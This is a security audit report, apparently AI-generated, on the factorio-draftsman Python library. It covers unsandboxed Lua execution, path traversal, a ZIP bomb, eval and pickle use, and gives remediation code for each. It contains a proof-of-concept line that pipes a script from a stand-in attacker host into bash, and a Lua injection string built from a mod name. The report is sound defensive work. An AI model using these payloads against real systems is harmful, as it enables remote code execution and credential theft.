# Security Audit Report: factorio-draftsman

**Date:** 2026-01-11
**Auditor:** Claude (Automated Security Audit)
**Scope:** Full codebase security review

---

## Executive Summary

This security audit identified **5 critical**, **7 high**, and **6 medium** severity issues in the factorio-draftsman codebase. The most severe vulnerabilities relate to:

1. Unsandboxed Lua code execution from untrusted mod files
2. Arbitrary file system access exposed to Lua scripts
3. ZIP bomb vulnerability in blueprint string parsing
4. Code injection via unsafe string formatting into Lua code
5. Path traversal vulnerabilities in archive handling

**Overall Risk Level:** HIGH

---

## Critical Vulnerabilities

### 1. Unsandboxed Lua Runtime Execution

| Attribute | Value |
|-----------|-------|
| **Severity** | CRITICAL |
| **File** | `draftsman/environment/update.py` |
| **Line** | 619 |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |

**Description:**
The Lua runtime is instantiated without any sandbox restrictions:

```python
lua = lupa.LuaRuntime(unpack_returned_tuples=True)
```

All Lua standard libraries are available, including dangerous functions:
- `os.execute()` - Execute arbitrary system commands
- `os.remove()` - Delete files
- `io.open()` - Read/write arbitrary files
- `debug.*` - Inspect and modify execution state

**Attack Vector:**
Malicious Factorio mods can execute arbitrary system commands with the privileges of the Python process when `update_draftsman_data()` is called.

**Proof of Concept:**
```lua
-- Malicious mod's data.lua
os.execute("curl http://attacker.com/shell.sh | bash")
```

**Recommendation:**
1. Sandbox the Lua runtime by removing dangerous globals:
```python
lua = lupa.LuaRuntime(unpack_returned_tuples=True)
lua.execute("""
    os = nil
    io = nil
    debug = nil
    loadstring = nil
    dofile = nil
""")
```
2. Implement static analysis to detect dangerous function calls before execution
3. Document security risks prominently for users installing untrusted mods

---

### 2. Arbitrary File Read via Lua Callback

| Attribute | Value |
|-----------|-------|
| **Severity** | CRITICAL |
| **File** | `draftsman/environment/update.py` |
| **Lines** | 675-681 |
| **CWE** | CWE-22 (Path Traversal) |

**Description:**
A Python function for reading files is exposed directly to Lua without path validation:

```python
def py_get_file(filepath):
    try:
        return open(filepath, mode="r", encoding="utf-8-sig")
    except Exception as e:
        return None, repr(e)

lua.globals().py_get_file = py_get_file
```

**Attack Vector:**
Lua scripts can read any file accessible to the Python process:
- `/etc/passwd`, `/etc/shadow`
- SSH keys, API tokens, credentials
- `/proc/self/environ` (environment variables)

**Recommendation:**
1. Validate file paths against a whitelist of allowed directories
2. Use `os.path.realpath()` to resolve symlinks and detect traversal
3. Implement path containment checks:
```python
def py_get_file(filepath):
    allowed_base = "/path/to/mods"
    real_path = os.path.realpath(filepath)
    if not real_path.startswith(allowed_base):
        return None, "Access denied"
    return open(real_path, mode="r", encoding="utf-8-sig")
```

---

### 3. ZIP Bomb Vulnerability

| Attribute | Value |
|-----------|-------|
| **Severity** | CRITICAL |
| **File** | `draftsman/utils.py` |
| **Lines** | 382-399 |
| **CWE** | CWE-409 (Improper Handling of Highly Compressed Data) |

**Description:**
Blueprint string decompression has no size limits:

```python
def string_to_JSON(string: str) -> dict:
    try:
        return json.loads(zlib.decompress(base64.b64decode(string[1:])))
    except Exception as e:
        raise MalformedBlueprintStringError(e)
```

**Attack Vector:**
An attacker can craft a malicious blueprint string that decompresses to gigabytes, causing:
- Out-of-memory crashes
- Resource exhaustion denial of service
- System instability

**Recommendation:**
```python
import zlib

MAX_DECOMPRESSED_SIZE = 10 * 1024 * 1024  # 10 MB limit

def string_to_JSON(string: str) -> dict:
    if len(string) < 2:
        raise MalformedBlueprintStringError("String too short")

    compressed_data = base64.b64decode(string[1:])

    # Use incremental decompression with size limit
    decompressor = zlib.decompressobj()
    chunks = []
    total_size = 0

    chunk = decompressor.decompress(compressed_data, MAX_DECOMPRESSED_SIZE)
    total_size += len(chunk)
    chunks.append(chunk)

    if decompressor.unconsumed_tail:
        raise MalformedBlueprintStringError("Decompressed data exceeds size limit")

    return json.loads(b"".join(chunks))
```

---

### 4. Lua Code Injection via Mod Names

| Attribute | Value |
|-----------|-------|
| **Severity** | CRITICAL |
| **File** | `draftsman/environment/update.py` |
| **Lines** | 369, 415 |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |

**Description:**
Mod names are directly interpolated into Lua code without escaping:

```python
file_name = "__{}__/{}".format(mod.name, stage)
lua.globals().REQUIRE_STACK = lua.eval('{{"{}"}}'.format(file_name))
```

**Attack Vector:**
A mod with a crafted name can inject arbitrary Lua code:
```
Mod name: test"}} do os.execute("malicious_command") end local x = {"
```

This breaks out of the string literal and executes arbitrary code.

**Recommendation:**
1. Use Lua's table construction APIs instead of string formatting
2. Escape special characters in mod names before interpolation
3. Validate mod names against a strict pattern (alphanumeric, hyphens, underscores only)

---

### 5. Archive Path Traversal

| Attribute | Value |
|-----------|-------|
| **Severity** | CRITICAL |
| **File** | `draftsman/environment/mod_list.py` |
| **Lines** | 150, 176-182 |
| **CWE** | CWE-22 (Path Traversal) |

**Description:**
File paths from ZIP archives are used without validation:

```python
def archive_to_string(archive: zipfile.ZipFile, filepath: str) -> str:
    with archive.open(filepath, mode="r") as file:
        formatted_file = io.TextIOWrapper(file, encoding="utf-8-sig")
        return formatted_file.read()
```

**Attack Vector:**
A malicious ZIP mod file can contain entries with path traversal sequences (e.g., `../../etc/passwd`) to access files outside the intended directory.

**Recommendation:**
```python
def archive_to_string(archive: zipfile.ZipFile, filepath: str) -> str:
    # Validate path doesn't contain traversal sequences
    if ".." in filepath or filepath.startswith("/"):
        raise ValueError("Invalid path in archive")

    # Ensure the path is within expected mod structure
    normalized = os.path.normpath(filepath)
    if normalized.startswith(".."):
        raise ValueError("Path traversal detected")

    with archive.open(filepath, mode="r") as file:
        formatted_file = io.TextIOWrapper(file, encoding="utf-8-sig")
        return formatted_file.read()
```

---

## High Severity Vulnerabilities

### 6. Python eval() for Version Comparison

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **File** | `draftsman/environment/update.py` |
| **Lines** | 580-581 |
| **CWE** | CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code) |

**Description:**
Version comparison uses `eval()` with dynamically constructed expressions:

```python
expr = str(actual_version) + dependency.operation + str(target_version)
if not eval(expr):
    raise IncorrectModVersionError(...)
```

While currently mitigated by regex validation limiting operators to `[><=]=?`, this pattern is fragile and violates security best practices.

**Recommendation:**
Replace with direct comparison:
```python
import operator

ops = {
    "==": operator.eq,
    ">=": operator.ge,
    "<=": operator.le,
    ">": operator.gt,
    "<": operator.lt,
}

if not ops[dependency.operation](actual_version, target_version):
    raise IncorrectModVersionError(...)
```

---

### 7. Dynamic Code Generation with eval(compile())

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **File** | `draftsman/serialization.py` |
| **Line** | 439 |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |

**Description:**
Serialization functions are dynamically generated and executed:

```python
script = "\n".join(total_lines)
eval(compile(script, fname, "exec"), globs)
```

While the input comes from internal class schemas rather than user input, this pattern is inherently risky.

**Recommendation:**
1. Use pre-compiled function templates instead of dynamic generation
2. If dynamic generation is necessary, use a restricted execution environment
3. Validate all inputs to the code generation process

---

### 8. Pickle Deserialization

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **File** | `draftsman/data/*.py` |
| **Lines** | Various (12 locations) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |

**Description:**
Multiple pickle files are loaded without restriction:

```python
with source.open("rb") as inp:
    _data = pickle.load(inp)
```

**Affected Files:**
- `draftsman/data/entities.py:26`
- `draftsman/data/items.py:17`
- `draftsman/data/recipes.py:17`
- `draftsman/data/signals.py:16`
- `draftsman/data/mods.py:13`
- `draftsman/data/tiles.py:13`
- `draftsman/data/planets.py:13`
- `draftsman/data/equipment.py:10`
- `draftsman/data/qualities.py:12`
- `draftsman/data/modules.py:16`
- `draftsman/data/instruments.py:16`
- `draftsman/data/fluids.py:13`

**Risk:**
While pickle files are bundled with the package, supply-chain attacks or package tampering could inject malicious pickles.

**Recommendation:**
1. Use a restricted unpickler that only allows safe types:
```python
import pickle

class SafeUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        'builtins': {'dict', 'list', 'set', 'frozenset', 'tuple'},
    }

    def find_class(self, module, name):
        if module in self.ALLOWED_CLASSES:
            if name in self.ALLOWED_CLASSES[module]:
                return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Forbidden class: {module}.{name}")
```
2. Consider migrating to JSON for simple data structures
3. Sign pickle files and verify signatures before loading

---

### 9. Recursive Dict Merge Without Depth Limit

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **File** | `draftsman/utils.py` |
| **Lines** | 796-809 |
| **CWE** | CWE-674 (Uncontrolled Recursion) |

**Description:**
Recursive dictionary merge has no depth limit:

```python
def dict_merge(a: dict, b: dict) -> dict:
    for key in b:
        if key in a:
            if isinstance(a[key], dict) and isinstance(b[key], dict):
                dict_merge(a[key], b[key])  # Unlimited recursion
```

**Attack Vector:**
A deeply nested JSON structure in a blueprint string can cause `RecursionError` and crash the application.

**Recommendation:**
```python
def dict_merge(a: dict, b: dict, max_depth: int = 100) -> dict:
    if max_depth <= 0:
        raise ValueError("Maximum recursion depth exceeded")
    for key in b:
        if key in a and isinstance(a[key], dict) and isinstance(b[key], dict):
            dict_merge(a[key], b[key], max_depth - 1)
        else:
            a[key] = b[key]
    return a
```

---

### 10. No Input Validation Before Processing

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **File** | `draftsman/utils.py` |
| **Line** | 397 |
| **CWE** | CWE-20 (Improper Input Validation) |

**Description:**
No validation before processing blueprint strings:

```python
return json.loads(zlib.decompress(base64.b64decode(string[1:])))
```

- No check that string has minimum length
- No validation of base64 format
- No type checking

**Recommendation:**
```python
def string_to_JSON(string: str) -> dict:
    if not isinstance(string, str):
        raise MalformedBlueprintStringError("Input must be a string")
    if len(string) < 2:
        raise MalformedBlueprintStringError("Blueprint string too short")
    if string[0] != '0':
        raise MalformedBlueprintStringError("Invalid blueprint version prefix")
    # ... continue with processing
```

---

### 11. Folder-Based Path Traversal

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **File** | `draftsman/environment/mod_list.py` |
| **Line** | 152 |
| **CWE** | CWE-22 (Path Traversal) |

**Description:**
Simple string concatenation without path normalization:

```python
return file_to_string(filepath=self.location + "/" + filepath)
```

**Recommendation:**
```python
import os

def get_file(self, filepath: str) -> str:
    # Normalize and validate the path
    full_path = os.path.normpath(os.path.join(self.location, filepath))
    if not full_path.startswith(os.path.normpath(self.location)):
        raise ValueError("Path traversal detected")
    return file_to_string(filepath=full_path)
```

---

### 12. Unsafe Regex Substitution

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **File** | `draftsman/environment/update.py` |
| **Lines** | 249-252 |
| **CWE** | CWE-1333 (Inefficient Regular Expression Complexity) |

**Description:**
Mod location is used directly in `re.sub()`:

```python
module_name = rename.sub(mods_list[match[1]].location, module_name)
```

If `mod.location` contains regex special characters (`\1`, `\g<1>`), they could be interpreted as backreferences.

**Recommendation:**
```python
module_name = rename.sub(re.escape(mods_list[match[1]].location), module_name)
# Or use a lambda:
module_name = rename.sub(lambda m: mods_list[m[1]].location, module_name)
```

---

## Medium Severity Vulnerabilities

### 13. Overly Broad Exception Handling

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **File** | `draftsman/utils.py` |
| **Lines** | 396-399 |

**Description:**
All exceptions are caught and wrapped:

```python
except Exception as e:
    raise MalformedBlueprintStringError(e)
```

This hides legitimate bugs and makes debugging difficult.

**Recommendation:**
Catch specific exceptions only:
```python
except (base64.binascii.Error, zlib.error, json.JSONDecodeError) as e:
    raise MalformedBlueprintStringError(e)
```

---

### 14. Unvalidated JSON Dictionary Access

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **File** | `draftsman/classes/blueprint.py` |
| **Lines** | 524, 547 |

**Description:**
Direct dictionary access without key validation:

```python
entity_id = point["entity_id"]  # KeyError if missing
```

**Recommendation:**
Use `.get()` with validation or implement schema validation.

---

### 15. No Entity Count Limits

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **File** | `draftsman/classes/blueprint.py` |
| **Lines** | 500-540 |

**Description:**
Blueprints can contain unlimited entities, potentially causing memory exhaustion.

**Recommendation:**
Add configurable entity count limits.

---

### 16. Unvalidated Field Access Pattern

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **File** | `draftsman/classes/blueprint.py` |
| **Lines** | 520-525 |

**Description:**
Loop variables from JSON are used without validation:

```python
for color in connections[side]:  # color is unvalidated
```

---

### 17. Untrusted JSON Without Schema Validation

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **File** | `draftsman/classes/blueprintable.py` |
| **Lines** | 63-85 |

**Description:**
JSON types are not validated before access:

```python
if "version" in json_dict[root_item]:
    version = decode_version(json_dict[root_item]["version"])
```

---

### 18. Debug Library Not Fully Restricted in Lua

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **File** | `draftsman/compatibility/interface.lua` |
| **Lines** | 71-114 |

**Description:**
While `debug.traceback` is overridden, the rest of the debug library remains available.

---

## Recommendations Summary

### Immediate Actions (Critical)

1. **Sandbox Lua runtime** - Remove dangerous globals (`os`, `io`, `debug`)
2. **Validate file paths** in `py_get_file()` callback
3. **Add decompression size limits** to prevent ZIP bombs
4. **Escape mod names** before Lua code interpolation
5. **Validate archive paths** to prevent traversal

### Short-Term Actions (High)

6. **Replace eval()** with direct comparison for version checks
7. **Review dynamic code generation** in serialization
8. **Implement restricted pickle unpickler** or migrate to JSON
9. **Add recursion depth limits** to dict merge
10. **Validate input** before processing blueprint strings
11. **Fix path concatenation** with proper normalization
12. **Escape regex replacement** strings

### Medium-Term Actions (Medium)

13. **Narrow exception handling** to specific types
14. **Add JSON schema validation** for untrusted input
15. **Implement entity count limits**
16. **Validate all JSON field access**
17. **Restrict remaining Lua debug functions**
18. **Add security documentation** for users

---

## Files Requiring Review

| File | Issues | Priority |
|------|--------|----------|
| `draftsman/environment/update.py` | Lua sandbox, eval(), file access | CRITICAL |
| `draftsman/utils.py` | ZIP bomb, input validation, recursion | CRITICAL |
| `draftsman/environment/mod_list.py` | Path traversal | CRITICAL |
| `draftsman/serialization.py` | Dynamic code generation | HIGH |
| `draftsman/data/*.py` | Pickle deserialization | HIGH |
| `draftsman/classes/blueprint.py` | Input validation | MEDIUM |
| `draftsman/classes/blueprintable.py` | Schema validation | MEDIUM |
| `draftsman/compatibility/interface.lua` | Debug library | MEDIUM |

---

## Conclusion

The factorio-draftsman codebase has significant security vulnerabilities, primarily around:
1. Unsandboxed execution of untrusted Lua code from mods
2. Insufficient input validation for blueprint strings
3. Unsafe use of `eval()` and dynamic code generation

Users should exercise extreme caution when using this library with untrusted mods. The development team should prioritize the critical vulnerabilities, particularly the Lua sandboxing issues, as these allow arbitrary code execution.

---

*This audit was performed using static analysis. Dynamic testing and penetration testing may reveal additional vulnerabilities.*
